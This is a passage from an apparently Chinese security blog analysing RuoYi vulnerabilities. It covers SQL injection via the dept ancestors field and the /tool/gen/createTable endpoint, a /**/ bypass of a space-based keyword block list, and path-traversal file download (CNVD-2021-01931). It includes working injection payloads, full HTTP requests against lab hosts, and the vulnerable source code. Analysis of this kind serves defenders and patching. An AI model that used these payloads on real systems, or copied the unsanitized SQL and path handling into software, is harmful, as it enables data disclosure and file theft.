dept.setUpdateBy(ShiroUtils.getLoginName());<br>    <span class="hljs-keyword">return</span> toAjax(deptService.updateDept(dept));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>传入参数类型是<code>SysDept</code>，其中参数内容包括<code>ancestors</code>，因此可以通过定义<code>ancestors</code>的内容实现 sql 注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 部门表 sys_dept</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ruoyi</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SysDept</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseEntity</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-comment">/** 部门ID */</span><br>    <span class="hljs-keyword">private</span> Long deptId;<br><br>    <span class="hljs-comment">/** 父部门ID */</span><br>    <span class="hljs-keyword">private</span> Long parentId;<br><br>    <span class="hljs-comment">/** 祖级列表 */</span><br>    <span class="hljs-keyword">private</span> String ancestors;<br><br>    <span class="hljs-comment">/** 部门名称 */</span><br>    <span class="hljs-keyword">private</span> String deptName;<br><br>    <span class="hljs-comment">/** 显示顺序 */</span><br>    <span class="hljs-keyword">private</span> String orderNum;<br><br>    <span class="hljs-comment">/** 负责人 */</span><br>    <span class="hljs-keyword">private</span> String leader;<br><br>    <span class="hljs-comment">/** 联系电话 */</span><br>    <span class="hljs-keyword">private</span> String phone;<br><br>    <span class="hljs-comment">/** 邮箱 */</span><br>    <span class="hljs-keyword">private</span> String email;<br><br>    <span class="hljs-comment">/** 部门状态:0正常,1停用 */</span><br>    <span class="hljs-keyword">private</span> String status;<br><br>    <span class="hljs-comment">/** 删除标志（0代表存在 2代表删除） */</span><br>    <span class="hljs-keyword">private</span> String delFlag;<br><br>    <span class="hljs-comment">/** 父部门名称 */</span><br>    <span class="hljs-keyword">private</span> String parentName;<br><br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>ps：虽然在代码中并没有看到相关的限制行为，但是在实际测试的过程中发现，对<code>ancestors</code>似乎是由长度限制的，我这边就不进行深入分析了，有兴趣的师傅可以分析一下原因。</p>
</blockquote>
<h2 id="2-8-注入点-tool-gen-createTable接口（V4-7-1）"><a href="#2-8-注入点-tool-gen-createTable接口（V4-7-1）" class="headerlink" title="2.8 注入点/tool/gen/createTable接口（V4.7.1）"></a>2.8 注入点<code>/tool/gen/createTable</code>接口（V4.7.1）</h2><h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span> candy <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()), <span class="hljs-number">0x7e</span>));<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658493913-0f14b8e4-9be7-48a4-aa17-1e8d84ecac8a.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">POST <span class="hljs-operator">/</span>tool<span class="hljs-operator">/</span>gen<span class="hljs-operator">/</span>createTable HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span><br><span class="hljs-keyword">User</span><span class="hljs-operator">-</span>Agent: Mozilla<span class="hljs-operator">/</span><span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">141.0</span>) Gecko<span class="hljs-operator">/</span><span class="hljs-number">20100101</span> Firefox<span class="hljs-operator">/</span><span class="hljs-number">141.0</span><br>Accept: application<span class="hljs-operator">/</span>json, text<span class="hljs-operator">/</span>javascript, <span class="hljs-operator">*</span><span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 92</span><br><span class="hljs-comment">Origin: http://192.168.1.10</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.1.10/tool/gen/createTable</span><br><span class="hljs-comment">Cookie: JSESSIONID=ac820c87-df58-41f8-b397-61ee0cd96e25</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">sql=CREATE+table+candy+as+select+extractvalue(1%2Cconcat(0x7e%2C(select+user())%2C+0x7e))%3B</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658521580-efbc864f-a8ef-4e1a-a6bb-13b5c86f9c3d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658543121-d3bef20c-3f25-4c0c-99d7-7e873f185977.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;createTable&quot;</span>&gt;</span><br>       $&#123;sql&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresRoles(&quot;admin&quot;)</span><br><span class="hljs-meta">@Log(title = &quot;创建表&quot;, businessType = BusinessType.OTHER)</span><br><span class="hljs-meta">@PostMapping(&quot;/createTable&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">create</span><span class="hljs-params">(String sql)</span><br>&#123;<br>    List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);<br>    List&lt;String&gt; tableNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (SQLStatement sqlStatement : sqlStatements)<br>    &#123;<br>        <span class="hljs-comment">// 判断sqlstatement是否为mysql创建表的语句对象</span><br>        <span class="hljs-keyword">if</span> (sqlStatement <span class="hljs-keyword">instanceof</span> MySqlCreateTableStatement)<br>        &#123;<br>            <span class="hljs-type">MySqlCreateTableStatement</span> <span class="hljs-variable">createTableStatement</span> <span class="hljs-operator">=</span> (MySqlCreateTableStatement) sqlStatement;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">tableName</span> <span class="hljs-operator">=</span> createTableStatement.getTableName();<br>            tableName = tableName.replaceAll(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> genTableService.createTable(createTableStatement.toString());<br>            <span class="hljs-keyword">if</span> (msg == <span class="hljs-number">0</span>)<br>            &#123;<br>                tableNames.add(tableName);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;请输入建表语句&quot;</span>);<br>        &#125;<br>    &#125;<br>    List&lt;GenTable&gt; tableList = genTableService.selectDbTableListByNames((tableNames.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[tableNames.size()])));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">operName</span> <span class="hljs-operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="hljs-string">&quot;loginName&quot;</span>));<br>    genTableService.importGenTable(tableList, operName);<br>    <span class="hljs-keyword">return</span> AjaxResult.success();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>根据代码中表现出来的结果可以看出，只要是创建表的 sql 语句即<code>create table</code>都可以执行；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create table candy as select <span class="hljs-title function_">extractvalue</span><span class="hljs-params">(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()</span>), <span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure>

<h2 id="2-9-注入点-tool-gen-createTable接口（4-7-1"><a href="#2-9-注入点-tool-gen-createTable接口（4-7-1" class="headerlink" title="2.9 注入点/tool/gen/createTable接口（4.7.1&lt;Version&lt;V4.7.5）"></a>2.9 注入点<code>/tool/gen/createTable</code>接口（4.7.1&lt;Version&lt;V4.7.5）</h2><h3 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create table candy as select<span class="hljs-comment">/**/extractvalue(1,concat(0x7e,(select/**/</span>user()),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278172549-c87d9956-25cc-4613-a032-80e79437ef13.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278190843-700d96b7-3cc4-4759-8e8b-a59e34d863e6.png" srcset="/img/loading.gif" lazyload></p>
<p>原始的 payload 已经行不通了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /tool/gen/createTable HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10.15</span>; rv:<span class="hljs-number">141.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">141.0</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 89</span><br><span class="hljs-comment">Origin: http://192.168.1.9</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.1.9/tool/gen/createTable</span><br><span class="hljs-comment">Cookie: JSESSIONID=32945bbe-0b10-45d5-91eb-166f46c6c44d</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">sql=create+table+candy+as+select+extractvalue(1%2Cconcat(0x7e%2C(select+user())%2C+0x7e))</span><br></code></pre></td></tr></table></figure>

<p>将 payload 中的 select 后面的空格使用<code>/**/</code>进行替换即可，具体原因请看漏洞分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create table candy as select<span class="hljs-comment">/**/extractvalue(1,concat(0x7e,(select/**/</span>user()),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278298486-cce6f9e3-15ea-4747-8d2c-e4aadfcd9bbf.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /tool/gen/createTable HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10.15</span>; rv:<span class="hljs-number">141.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">141.0</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 102</span><br><span class="hljs-comment">Origin: http://192.168.1.9</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.1.9/tool/gen/createTable</span><br><span class="hljs-comment">Cookie: JSESSIONID=32945bbe-0b10-45d5-91eb-166f46c6c44d</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">sql=create+table+candy+as+select%2F**%2Fextractvalue(1%2Cconcat(0x7e%2C(select%2F**%2Fuser())%2C0x7e))</span><br></code></pre></td></tr></table></figure>

<h3 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过观察该接口的控制器，可以发现在函数执行开始就对关键词进行了过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresRoles(&quot;admin&quot;)</span><br><span class="hljs-meta">@Log(title = &quot;创建表&quot;, businessType = BusinessType.OTHER)</span><br><span class="hljs-meta">@PostMapping(&quot;/createTable&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">create</span><span class="hljs-params">(String sql)</span><br>&#123;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        SqlUtil.filterKeyword(sql);<br>        List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);<br>        List&lt;String&gt; tableNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (SQLStatement sqlStatement : sqlStatements)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (sqlStatement <span class="hljs-keyword">instanceof</span> MySqlCreateTableStatement)<br>            &#123;<br>                <span class="hljs-type">MySqlCreateTableStatement</span> <span class="hljs-variable">createTableStatement</span> <span class="hljs-operator">=</span> (MySqlCreateTableStatement) sqlStatement;<br>                <span class="hljs-keyword">if</span> (genTableService.createTable(createTableStatement.toString()))<br>                &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tableName</span> <span class="hljs-operator">=</span> createTableStatement.getTableName().replaceAll(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                    tableNames.add(tableName);<br>                &#125;<br>            &#125;<br>        &#125;<br>        List&lt;GenTable&gt; tableList = genTableService.selectDbTableListByNames(tableNames.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[tableNames.size()]));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">operName</span> <span class="hljs-operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="hljs-string">&quot;loginName&quot;</span>));<br>        genTableService.importGenTable(tableList, operName);<br>        <span class="hljs-keyword">return</span> AjaxResult.success();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception e)<br>    &#123;<br>        logger.error(e.getMessage(), e);<br>        <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;创建表结构异常[&quot;</span> + e.getMessage() + <span class="hljs-string">&quot;]&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * SQL关键字检查</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">filterKeyword</span><span class="hljs-params">(String value)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(value))<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    String[] sqlKeywords = StringUtils.split(SQL_REGEX, <span class="hljs-string">&quot;\\|&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; sqlKeywords.length; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.indexOfIgnoreCase(value, sqlKeywords[i]) &gt; -<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UtilException</span>(<span class="hljs-string">&quot;参数存在SQL注入风险&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 定义常用的 sql关键字</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">SQL_REGEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;<br></code></pre></td></tr></table></figure>

<p>可以发现其对大部分的关键词都进行了过滤，但是这个过滤貌似不太严谨，连空格都匹配是什么意思？</p>
<p>那我不用空格不就 bypass 了吗，没搞懂，空格使用<code>/**/</code>即可绕过</p>
<h1 id="3-任意文件下载"><a href="#3-任意文件下载" class="headerlink" title="3 任意文件下载"></a>3 任意文件下载</h1><h2 id="3-1-CNVD-2021-01931任意文件下载（"><a href="#3-1-CNVD-2021-01931任意文件下载（" class="headerlink" title="3.1 CNVD-2021-01931任意文件下载（&lt;V4.5.1）"></a>3.1 CNVD-2021-01931任意文件下载（&lt;V4.5.1）</h2><h3 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span><span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>download<span class="hljs-operator">/</span>resource?resource<span class="hljs-operator">=</span><span class="hljs-operator">/</span>profile<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>Windows<span class="hljs-operator">/</span>win.ini<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GET</span> <span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>download<span class="hljs-operator">/</span>resource?resource<span class="hljs-operator">=</span><span class="hljs-operator">/</span>profile<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>Windows<span class="hljs-operator">/</span>win.ini HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span><br><span class="hljs-keyword">User</span><span class="hljs-operator">-</span>Agent: Mozilla<span class="hljs-operator">/</span><span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">141.0</span>) Gecko<span class="hljs-operator">/</span><span class="hljs-number">20100101</span> Firefox<span class="hljs-operator">/</span><span class="hljs-number">141.0</span><br>Accept: text<span class="hljs-operator">/</span>html,application<span class="hljs-operator">/</span>xhtml<span class="hljs-operator">+</span>xml,application<span class="hljs-operator">/</span>xml;q<span class="hljs-operator">=</span><span class="hljs-number">0.9</span>,<span class="hljs-operator">*</span><span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Cookie: JSESSIONID=ac820c87-df58-41f8-b397-61ee0cd96e25</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Priority: u=0, i</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754656423483-0215f4aa-42f6-42e7-92f9-dcdd57b1685a.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754656449028-052bc28a-51f6-4aa1-b645-08281052f25e.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>下面即为相应文件下载接口的处理函数；这个文件下载接口是通过获取<code>profile</code>变量的内容拼接<code>resource</code>参数中<code>/profile</code>后的内容进行的文件下载。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 本地资源通用下载</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 本地资源路径</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <span class="hljs-comment">// 数据库资源地址</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <span class="hljs-comment">// 下载名称</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由于该函数并没有对<code>resource</code>参数的内容进行任何过滤，因此会非常容易导致目录穿越等漏洞的产生；</p>
<p>这里也是没有过滤，所以通过目录穿越也是能够实现任意文件下载；</p>
<h2 id="3-2-CVE-2023-27025-若依任意文件下载（"><a href="#3-2-CVE-2023-27025-若依任意文件下载（" class="headerlink" title="3.2 CVE-2023-27025 若依任意文件下载（&lt;V4.7.7）"></a>3.2 CVE-2023-27025 若依任意文件下载（&lt;V4.7.7）</h2><h3 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先通过定时任务执行<code>setProfile</code>函数修改<code>profile</code>设置的内容</p>
